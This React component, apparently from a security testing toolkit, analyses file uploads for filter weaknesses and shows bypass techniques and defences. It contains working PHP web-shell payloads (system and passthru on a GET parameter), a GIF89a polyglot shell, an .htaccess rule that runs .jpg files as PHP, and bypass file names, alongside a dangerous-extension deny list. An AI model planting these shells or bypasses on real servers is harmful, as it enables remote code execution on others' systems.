import React, { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './Tool.module.css';

export default function FileUploadTester() {
  const [fileName, setFileName] = useState('test.php');
  const [fileContent, setFileContent] = useState('<?php phpinfo(); ?>');
  const [contentType, setContentType] = useState('application/x-php');
  const [results, setResults] = useState<any>(null);
  const setActiveGalaxyTool = useStore((state) => state.setActiveGalaxyTool);

  const bypassTechniques = [
    { name: 'Double Extension', example: 'shell.php.jpg', risk: 'High' },
    { name: 'Null Byte', example: 'shell.php%00.jpg', risk: 'Medium' },
    { name: 'Case Manipulation', example: 'shell.PhP', risk: 'Medium' },
    { name: 'Special Characters', example: 'shell.php....', risk: 'Medium' },
    { name: 'Alternate Extension', example: 'shell.php5', risk: 'High' },
    { name: 'Content-Type Mismatch', example: 'shell.php (image/jpeg)', risk: 'High' },
    { name: 'Magic Bytes Injection', example: 'GIF89a + PHP code', risk: 'Critical' },
    { name: 'MIME Confusion', example: 'Polyglot file', risk: 'Critical' },
    { name: 'Path Traversal', example: '../../../shell.php', risk: 'Critical' },
    { name: 'Unicode Bypass', example: 'shell.p\u0068p', risk: 'Medium' },
  ];

  const dangerousExtensions = [
    '.php', '.php3', '.php4', '.php5', '.phtml', '.pht',
    '.jsp', '.jspx', '.jsw', '.jsv', '.jspf',
    '.asp', '.aspx', '.asa', '.cer', '.cdx',
    '.exe', '.bat', '.cmd', '.com', '.pif',
    '.sh', '.bash', '.cgi', '.pl', '.py',
    '.rb', '.jar', '.war', '.htaccess', '.config',
  ];

  const analyzeUpload = () => {
    const analysis: any = {
      fileName,
      fileContent: fileContent.substring(0, 100),
      contentType,
      vulnerabilities: [],
      bypassAttempts: [],
      recommendations: [],
    };

    // Extension analysis
    const ext = fileName.substring(fileName.lastIndexOf('.')).toLowerCase();
    if (dangerousExtensions.includes(ext)) {
      analysis.vulnerabilities.push({
        type: 'Dangerous Extension',
        severity: 'Critical',
        description: `File extension "${ext}" allows server-side code execution`,
      });
    }

    // Double extension check
    if ((fileName.match(/\./g) || []).length > 1) {
      analysis.vulnerabilities.push({
        type: 'Multiple Extensions',
        severity: 'High',
        description: 'Multiple dots detected - may bypass simple extension checks',
      });
    }

    // Null byte check
    if (fileName.includes('%00') || fileName.includes('\x00')) {
      analysis.vulnerabilities.push({
        type: 'Null Byte Injection',
        severity: 'High',
        description: 'Null byte can truncate filename in vulnerable parsers',
      });
    }

    // Path traversal check
    if (fileName.includes('../') || fileName.includes('..\\')) {
      analysis.vulnerabilities.push({
        type: 'Path Traversal',
        severity: 'Critical',
        description: 'Filename contains path traversal sequences',
      });
    }

    // Content analysis
    const contentLower = fileContent.toLowerCase();
    
    if (contentLower.includes('<?php') || contentLower.includes('<?=')) {
      analysis.vulnerabilities.push({
        type: 'PHP Code',
        severity: 'Critical',
        description: 'File contains PHP code tags',
      });
    }

    if (contentLower.includes('<script') || contentLower.includes('javascript:')) {
      analysis.vulnerabilities.push({
        type: 'JavaScript/XSS',
        severity: 'High',
        description: 'File contains JavaScript code',
      });
    }

    if (contentLower.includes('<%') || contentLower.includes('<jsp:')) {
      analysis.vulnerabilities.push({
        type: 'JSP/ASP Code',
        severity: 'Critical',
        description: 'File contains JSP/ASP server-side code',
      });
    }

    // Content-Type mismatch
    const expectedTypes: any = {
      '.jpg': 'image/jpeg',
      '.jpeg': 'image/jpeg',
      '.png': 'image/png',
      '.gif': 'image/gif',
      '.pdf': 'application/pdf',
    };

    const expectedType = expectedTypes[ext];
    if (expectedType && expectedType !== contentType) {
      analysis.vulnerabilities.push({
        type: 'MIME Type Mismatch',
        severity: 'High',
        description: `Content-Type ${contentType} doesn't match extension ${ext}`,
      });
    }

    // Magic bytes check
    if (fileContent.startsWith('GIF89a') || fileContent.startsWith('GIF87a')) {
      analysis.bypassAttempts.push('GIF header detected (polyglot file attempt)');
    }

    if (fileContent.startsWith('\xFF\xD8\xFF')) {
      analysis.bypassAttempts.push('JPEG magic bytes detected');
    }

    // Security recommendations
    analysis.recommendations = [
      '✅ Validate file extensions against strict whitelist',
      '✅ Verify file content matches declared MIME type',
      '✅ Check magic bytes/file signatures',
      '✅ Rename uploaded files to random names',
      '✅ Store uploads outside web root',
      '✅ Disable script execution in upload directory',
      '✅ Implement file size limits',
      '✅ Scan files with antivirus before serving',
      '✅ Use Content-Disposition header for downloads',
      '✅ Implement rate limiting on uploads',
    ];

    // Generate bypass suggestions
    analysis.bypassSuggestions = {
      'Extension Bypass': [
        `${fileName.split('.')[0]}.php.jpg`,
        `${fileName.split('.')[0]}.php%00.jpg`,
        `${fileName.split('.')[0]}.PhP`,
        `${fileName.split('.')[0]}.php5`,
      ],
      'Path Traversal': [
        `../../${fileName}`,
        `..%2F..%2F${fileName}`,
      ],
      'Magic Bytes': [
        'GIF89a<?php system($_GET["cmd"]); ?>',
        'GIF89a\n<?php phpinfo(); ?>',
      ],
    };

    setResults(analysis);
  };

  const loadExample = (type: string) => {
    switch (type) {
      case 'php':
        setFileName('webshell.php');
        setFileContent('<?php system($_GET["cmd"]); ?>');
        setContentType('application/x-php');
        break;
      case 'polyglot':
        setFileName('image.jpg');
        setFileContent('GIF89a<?php phpinfo(); ?>');
        setContentType('image/gif');
        break;
      case 'double-ext':
        setFileName('shell.php.jpg');
        setFileContent('<?php passthru($_GET["c"]); ?>');
        setContentType('image/jpeg');
        break;
      case 'htaccess':
        setFileName('.htaccess');
        setFileContent('AddType application/x-httpd-php .jpg');
        setContentType('text/plain');
        break;
    }
  };

  return (
    <div className={styles.tool}>
      <div className={styles.header}>
        <button className={styles.backButton} onClick={() => setActiveGalaxyTool(null)}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <path d="M19 12H5M12 19l-7-7 7-7" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </button>
        <div>
          <h2 className={styles.title}>📁 File Upload Tester</h2>
          <p className={styles.description}>Analyze file upload security and bypass techniques</p>
        </div>
      </div>

      <div className={styles.content}>
        <div className={styles.warning}>
          ⚠️ <strong>Legal Notice:</strong> Only test file uploads on systems you have permission to test.
        </div>

        <div className={styles.section}>
          <label className={styles.label}>File Name</label>
          <input
            className={styles.input}
            type="text"
            value={fileName}
            onChange={(e) => setFileName(e.target.value)}
            placeholder="shell.php"
          />
        </div>

        <div className={styles.section}>
          <label className={styles.label}>File Content</label>
          <textarea
            className={styles.textarea}
            value={fileContent}
            onChange={(e) => setFileContent(e.target.value)}
            placeholder="File content..."
            rows={6}
          />
        </div>

        <div className={styles.section}>
          <label className={styles.label}>Content-Type</label>
          <input
            className={styles.input}
            type="text"
            value={contentType}
            onChange={(e) => setContentType(e.target.value)}
            placeholder="application/x-php"
          />
        </div>

        <div className={styles.buttonGroup}>
          <button className={styles.button} onClick={analyzeUpload}>
            Analyze Upload
          </button>
          <button className={styles.buttonSecondary} onClick={() => loadExample('php')}>
            PHP Shell
          </button>
          <button className={styles.buttonSecondary} onClick={() => loadExample('polyglot')}>
            Polyglot
          </button>
          <button className={styles.buttonSecondary} onClick={() => loadExample('double-ext')}>
            Double Ext
          </button>
        </div>

        <div className={styles.section}>
          <h3 className={styles.subtitle}>Bypass Techniques</h3>
          <div className={styles.resultList}>
            {bypassTechniques.map((tech, idx) => (
              <div key={idx} className={styles.resultItem}>
                <div className={styles.resultHeader}>
                  <strong>{tech.name}</strong>
                  <span className={`${styles.badge} ${styles[tech.risk.toLowerCase()]}`}>
                    {tech.risk}
                  </span>
                </div>
                <div className={styles.info}>
                  <strong>Example:</strong> <code>{tech.example}</code>
                </div>
              </div>
            ))}
          </div>
        </div>

        {results && (
          <div className={styles.section}>
            <h3 className={styles.subtitle}>Security Analysis</h3>
            
            {results.vulnerabilities.length > 0 && (
              <>
                <h4 style={{ color: '#ff3366' }}>⚠️ Vulnerabilities Detected</h4>
                {results.vulnerabilities.map((vuln: any, idx: number) => (
                  <div key={idx} className={styles.vulnerability}>
                    <div className={styles.vulnHeader}>
                      <strong>{vuln.type}</strong>
                      <span className={`${styles.badge} ${styles[vuln.severity.toLowerCase()]}`}>
                        {vuln.severity}
                      </span>
                    </div>
                    <div>{vuln.description}</div>
                  </div>
                ))}
              </>
            )}

            {results.bypassAttempts.length > 0 && (
              <>
                <h4 style={{ marginTop: '1rem' }}>🔍 Bypass Attempts Detected</h4>
                <ul>
                  {results.bypassAttempts.map((attempt: string, idx: number) => (
                    <li key={idx}>{attempt}</li>
                  ))}
                </ul>
              </>
            )}

            {results.bypassSuggestions && (
              <>
                <h4 style={{ marginTop: '1rem' }}>💡 Bypass Suggestions</h4>
                {Object.entries(results.bypassSuggestions).map(([category, suggestions]) => (
                  <div key={category} style={{ marginTop: '0.5rem' }}>
                    <strong>{category}:</strong>
                    <div className={styles.codeBlock}>
                      <pre>{(suggestions as string[]).join('\n')}</pre>
                    </div>
                  </div>
                ))}
              </>
            )}

            <h4 style={{ marginTop: '1rem' }}>✅ Security Recommendations</h4>
            <div className={styles.recommendations}>
              {results.recommendations.map((rec: string, idx: number) => (
                <div key={idx} className={styles.recommendation}>{rec}</div>
              ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
